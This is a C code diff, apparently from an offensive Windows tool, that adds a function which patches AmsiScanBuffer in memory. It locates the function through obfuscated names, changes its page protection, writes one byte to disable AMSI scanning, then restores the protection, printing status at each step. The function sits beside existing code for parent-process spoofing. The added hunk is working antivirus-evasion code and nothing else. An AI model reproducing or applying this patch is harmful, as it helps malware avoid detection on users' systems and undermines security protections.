@@ -374,3 +374,35 @@ PROCESS_INFORMATION ppid(SIZE_T attributeSize, STARTUPINFOEX six) {
 
 	return pi;
 }
+
+void amsiPatch() {
+	/* https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-amsi-x64.c */
+	NTSTATUS success;
+	DWORD oldPro = 0;
+	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;
+	DWORD offset = 0x83;
+	unsigned char patch[] = { '\x74' };
+	SIZE_T sizeOfPatch = sizeof(patch);
+
+	LPVOID ptrAm51Buff3r = hlpGetProcAddress(am51dll, am51Buff);
+	printf("[+] Location of AmsiScanBuffer: 0x%p\n", ptrAm51Buff3r);
+	char* value = (char*)ptrAm51Buff3r;
+
+	success = pVirtualProtect(hCurProc, &ptrAm51Buff3r, (PULONG)&sizeOfPatch, PAGE_EXECUTE_WRITECOPY, &oldPro);
+	if (NT_SUCCESS(success)) {
+		printf("[+] Protection of AmsiScanBuffer changed to wcx\n");
+	}
+
+	printf("[+] AmsiScanBuffer  before patching: %x\n", *(value + offset));
+	success = pWriteMem(hCurProc, value + offset, (PVOID)patch, 1, (SIZE_T*)NULL);
+	if (NT_SUCCESS(success)) {
+		printf("[+] Patch applied successfully\n");
+		printf("[+] AmsiScanBuffer  after patching: %x\n", *(value + offset));
+	}
+
+	success = pVirtualProtect(hCurProc, &ptrAm51Buff3r, (PULONG)&sizeOfPatch, oldPro, &oldPro);
+	if (NT_SUCCESS(success)) {
+		printf("[+] Protection of AmsiScanBuffer restored\n");
+		printf("[+] Patching successfull\n");
+	}
+}
